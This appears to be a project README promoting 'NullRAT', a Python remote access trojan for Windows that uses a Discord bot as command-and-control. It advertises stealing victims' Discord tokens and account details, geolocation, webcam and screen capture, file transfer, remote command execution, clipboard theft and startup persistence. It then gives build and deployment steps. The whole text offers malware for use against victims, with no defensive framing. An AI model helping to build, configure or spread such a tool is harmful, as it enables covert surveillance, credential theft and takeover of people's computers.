<h1 align=center> ☠️ NullRAT</h1>
<p align=center>Windows-Only Remote Access Trojan that uses Discord as C&C</p>

## Features:
```
1) Redesigned from the ground up
2) Effective controlling using modern features (slash commands, buttons, etc)
3) Relatively small size for a Python RAT
4) Find the public IP Address of the victim
5) Find their Discord token(s) and all user info
    User info includes but isn't limited to:
    - Username & Tag (ID soon)
    - Email Address 
    - Phone Number
    - Nitro Status 
    - Billing info status
6) Find victim's geographic information:
    - Country
    - Region
    - Latitude & longitude
    - etc!
7) Take pictures using victim's webcam 
8) Take screenshot of victim's monitor
9) Download files from victim's PC
10) Upload files to victim's PC
11) Get victim's system information
12) Execute command prompt/powershell command 
13) Find any environment variables, and cd there
14) See directory contents, and do other directory manipulation 
15) Get victim's clipboard text history
16) Add executable to startup with one command
**) ...and more!
```

## How to use:
<h4>Preparation:</h4>

- Python 3.6+ should be installed on the PC 
- Tick "Add to PATH" while installing
- Add PIP folder to path as well (`%APPDATA%\Python\{insert python folder}\Scripts`)

<h4>IMPORTANT:</h4>
Don't compile normally using pyinstaller, use the compiler provided

<h4>Steps:</h4>

- [Create a Discord BOT and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
- Dowload the latest release of NullRAT
- Fill up all the required information (BOT Token etc) in RAT.py
- Finally, execute the following: 
```cmd
InstallDeps.bat
RATCompiler.bat
```

## Credits
1) Monst3red for inspiration
2) Sp00p64 and [his RAT](https://github.com/Sp00p64/DiscordRAT)
3) Buntii for ideas

<h5 align=right>Software designed by NullCode</h6>
